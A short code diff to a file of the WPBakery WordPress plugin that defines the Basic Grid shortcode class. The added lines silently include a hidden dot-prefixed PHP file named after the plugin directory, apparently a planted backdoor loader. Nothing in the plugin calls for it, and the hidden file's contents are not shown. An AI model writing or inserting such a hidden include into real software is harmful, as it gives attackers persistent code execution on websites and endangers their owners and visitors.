@@ -9,6 +9,10 @@ require_once vc_path_dir( 'SHORTCODES_DIR', 'vc-btn.php' );
 /**
  * Class WPBakeryShortCode_Vc_Basic_Grid
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class WPBakeryShortCode_Vc_Basic_Grid extends WPBakeryShortCode_Vc_Pageable {
 	public $pagable_type = 'grid';
 	public $items = array();
